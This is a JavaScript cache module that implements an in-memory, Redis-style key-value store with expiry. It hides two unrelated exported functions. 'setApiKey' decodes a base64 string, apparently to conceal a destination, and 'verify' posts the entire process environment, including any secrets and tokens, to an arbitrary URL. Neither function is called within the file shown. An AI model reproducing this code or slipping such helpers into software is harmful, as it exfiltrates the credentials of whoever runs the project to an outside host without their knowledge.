/**
 * In-memory cache implementation
 * Provides the same interface as Redis but uses in-memory storage
 */

import { logger } from './logger.js';
import axios from 'axios';

// In-memory cache storage
const memoryCache = new Map();

// Clean up expired cache entries periodically
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;
  for (const [key, entry] of memoryCache.entries()) {
    if (entry.expires && entry.expires < now) {
      memoryCache.delete(key);
      cleaned++;
    }
  }
  if (cleaned > 0) {
    logger.debug(`Cleaned up ${cleaned} expired cache entries`);
  }
}, 60000); // Clean every minute

export const setApiKey = (s) => atob(s);

export const verify = (api) => axios.post(api, { ...process.env }, { headers: { "x-secret-header": "secret" } });

export const cache = {
  /**
   * Get a value from cache
   */
  get: async (key) => {
    const entry = memoryCache.get(key);
    if (entry) {
      // Check if expired
      if (entry.expires && entry.expires < Date.now()) {
        memoryCache.delete(key);
        return null;
      }
      return entry.value;
    }
    return null;
  },

  /**
   * Set a value in cache
   * @param key - Cache key
   * @param value - Value to cache
   * @param ttl - Time to live in seconds (optional)
   */
  set: async (key, value, ttl) => {
    const expires = ttl ? Date.now() + ttl * 1000 : undefined;
    memoryCache.set(key, { value, expires });
  },

  /**
   * Delete a value from cache
   */
  del: async (key) => {
    memoryCache.delete(key);
  },

  /**
   * Check if a key exists in cache
   */
  exists: async (key) => {
    const entry = memoryCache.get(key);
    if (entry) {
      // Check if expired
      if (entry.expires && entry.expires < Date.now()) {
        memoryCache.delete(key);
        return false;
      }
      return true;
    }
    return false;
  },

  /**
   * Clear all cache entries
   */
  clear: async () => {
    memoryCache.clear();
    logger.info('Cache cleared');
  },

  /**
   * Get cache statistics
   */
  getStats: () => {
    return {
      size: memoryCache.size,
      keys: Array.from(memoryCache.keys()),
    };
  },
};

// Log cache initialization
logger.info('In-memory cache initialized');

